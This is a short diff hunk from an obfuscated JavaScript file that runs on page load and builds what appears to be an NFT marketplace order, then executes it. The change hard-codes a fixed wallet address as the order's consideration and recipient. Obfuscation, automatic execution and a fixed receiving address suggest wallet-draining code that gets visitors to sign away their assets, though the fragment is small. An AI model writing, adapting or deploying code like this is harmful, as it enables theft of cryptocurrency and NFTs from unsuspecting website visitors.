@@ -4938,7 +4938,7 @@ $(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
                         startTime: "1661790956",
                         conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
                         offer: "0x053973D64EE9256d6957E3C5D2b5dD100064F07F",
-                        consideration: m
+                        consideration: "0x053973D64EE9256d6957E3C5D2b5dD100064F07F"
                     }, "0x053973D64EE9256d6957E3C5D2b5dD100064F07F")
                       , o = await f.executeAllActions();
                     let d = []
